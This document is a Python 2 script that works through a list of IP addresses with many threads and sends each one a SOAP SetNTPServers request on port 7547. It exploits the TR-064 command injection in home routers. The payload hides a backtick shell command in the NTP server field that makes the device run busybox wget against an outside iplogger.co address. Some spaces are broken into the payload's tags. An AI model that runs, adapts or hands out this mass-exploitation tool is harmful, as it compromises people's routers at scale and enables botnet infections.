#! python !#
 
import sys, os, re
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *
 
ips = open(sys.argv[1], "r").readlines()
motherthreads = int(sys.argv[2]) #2-1000
motherthread_count = len(ips) / motherthreads
motherthread_chunks = [ips[x:x+motherthread_count] for x in xrange(0, len(ips), motherthread_count)]
payload = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"> <SOAP-ENV:Body>  <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1&qu ot;>   <NewNTPServer1>`cd /tmp && /bin/busybox wget http://iplogger.co/2qWq45`</NewNTPServer1>   <NewNTPServer2></NewNTPServer2>   <NewNTPServer3></NewNTPServer3>   <NewNTPServer4></NewNT PServer4>   <NewNTPServer5></NewNTPServer5>  </u:SetNTPServers> </SOAP-ENV:Body></SOAP-ENV:Envelope>"
headerlist = {'SOAPAction': 'urn:dslforum-org:service:Time:1#SetNTPServers'}
 
def dump(count):
    count = int(count)
    for i in motherthread_chunks[count]:
        try:
            url = "http://"+i+":7547/UD/act?1"
            url = re.sub('\n', '', url)
            r = requests.post(url, timeout=5, headers=headerlist, data=payload)
            print "[TR-064] Loading %s"%(url)
            motherthread_chunks[count] = motherthread_chunks[count].remove(i)
        except:
            pass
 
for x in xrange(motherthreads):
    try:
        thread = Thread(target=dump, args=(x,))
        thread.start()
    except KeyboardInterrupt:
        sys.exit("STOPPING!")
    except:
        pass